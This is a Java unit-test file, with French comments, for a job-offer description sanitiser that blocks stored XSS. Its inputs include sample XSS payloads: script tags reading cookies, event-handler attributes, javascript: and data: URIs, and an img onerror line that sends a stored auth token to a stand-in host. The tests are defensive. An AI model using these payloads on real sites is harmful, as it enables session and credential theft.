package com.linqorbit.joboffer.service;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;

/**
 * Sanitisation de la description d'offre (D108) — la porte serveur qui ferme
 * le XSS stocké : le HTML écrit en base ne doit jamais contenir de balise
 * active, d'attribut d'événement ni d'URI non http(s).
 *
 * <p>Le vocabulaire est aligné sur ce que l'éditeur Tiptap produit
 * (`StarterKit`) et sur le miroir frontend
 * ({@code frontend/lib/utils/sanitize-html.ts}) : toute divergence ferait
 * perdre du contenu légitime à l'écriture.
 */
class JobOfferDescriptionSanitizerTest {

    private final JobOfferDescriptionSanitizer sanitizer = new JobOfferDescriptionSanitizer();

    @Test
    void conserveLeHtmlDeLEditeurTiptap() {
        String html = """
                <h2>About the role</h2>\
                <p>You will build <strong>APIs</strong> in <em>Java</em>, with <u>ownership</u> and <s>legacy</s> code.</p>\
                <h3>What you will do</h3>\
                <ul><li><p>Ship weekly</p></li><li><p>Own the roadmap</p></li></ul>\
                <ol><li><p>Design</p></li><li><p>Deliver</p></li></ol>\
                <blockquote><p>We ship together.</p></blockquote>\
                <pre><code>npm run build</code></pre>\
                <hr>\
                <p>See the <a href="https://example.com" target="_blank" rel="noopener noreferrer nofollow">docs</a>.<br>Bye</p>"""
                .strip();

        assertThat(sanitizer.sanitize(html)).isEqualTo(html);
    }

    @Test
    void retireLesScriptsEtLeurContenu() {
        String clean = sanitizer.sanitize("<p>Before</p><script>alert(document.cookie)</script><p>After</p>");

        assertThat(clean).isEqualTo("<p>Before</p><p>After</p>");
        assertThat(clean).doesNotContain("alert");
    }

    @Test
    void retireLesBalisesActivesAvecLeurContenu() {
        String clean = sanitizer.sanitize(
                "<p>ok</p><style>body{display:none}</style><iframe src=\"https://evil.test\"></iframe>"
                        + "<svg><script>alert(1)</script></svg><object data=\"x\"></object>"
                        + "<form><input name=\"a\"></form>");

        assertThat(clean).isEqualTo("<p>ok</p>");
        assertThat(clean).doesNotContain("iframe", "svg", "object", "form", "input", "style");
    }

    @Test
    void retireLesAttributsDEvenement() {
        String clean = sanitizer.sanitize(
                "<p onclick=\"steal()\" onmouseover=\"steal()\">Hi</p>"
                        + "<a href=\"https://example.com\" onclick=\"steal()\">link</a>");

        assertThat(clean).isEqualTo("<p>Hi</p><a href=\"https://example.com\">link</a>");
        assertThat(clean).doesNotContain("onclick", "onmouseover", "steal");
    }

    @Test
    void retireLesImagesEtLeursAttributs() {
        String clean = sanitizer.sanitize(
                "<p>ok</p><img src=x onerror=\"fetch('//x/'+localStorage.getItem('linqorbit.auth'))\">");

        assertThat(clean).isEqualTo("<p>ok</p>");
        assertThat(clean).doesNotContain("img", "onerror", "localStorage");
    }

    @Test
    void retireLesUrisQuiNeSontPasHttpOuHttps() {
        assertThat(sanitizer.sanitize("<a href=\"javascript:alert(1)\">bad</a>")).isEqualTo("<a>bad</a>");
        assertThat(sanitizer.sanitize("<a href=\"/jobs/abc\">relative</a>")).isEqualTo("<a>relative</a>");
        assertThat(sanitizer.sanitize("<a href=\"mailto:a@b.test\">mail</a>")).isEqualTo("<a>mail</a>");
        assertThat(sanitizer.sanitize("<a href=\"data:text/html,<script>alert(1)</script>\">data</a>"))
                .isEqualTo("<a>data</a>");
    }

    @Test
    void conserveLeTexteDesBalisesEcartees() {
        // Une balise hors vocabulaire perd sa balise, pas son texte utile.
        assertThat(sanitizer.sanitize("<div>kept text</div>")).isEqualTo("kept text");
        assertThat(sanitizer.sanitize("<h1>Title</h1><p>body</p>")).isEqualTo("Title<p>body</p>");
    }

    @Test
    void videOuBlancDonneNull() {
        assertThat(sanitizer.sanitize(null)).isNull();
        assertThat(sanitizer.sanitize("")).isNull();
        assertThat(sanitizer.sanitize("   \n  ")).isNull();
    }

    @Test
    void contenuReduitALaNuanDonneNull() {
        // Une charge utile entièrement malveillante ne laisse pas de description.
        assertThat(sanitizer.sanitize("<img src=x onerror=alert(1)>")).isNull();
        assertThat(sanitizer.sanitize("<script>alert(1)</script>")).isNull();
    }

    @Test
    void estIdempotent() {
        String dirty = "<p onclick=\"x()\">Hello <strong>world</strong></p>"
                + "<script>alert(1)</script><a href=\"javascript:alert(1)\">bad</a>";
        String once = sanitizer.sanitize(dirty);

        assertThat(sanitizer.sanitize(once)).isEqualTo(once);
    }
}
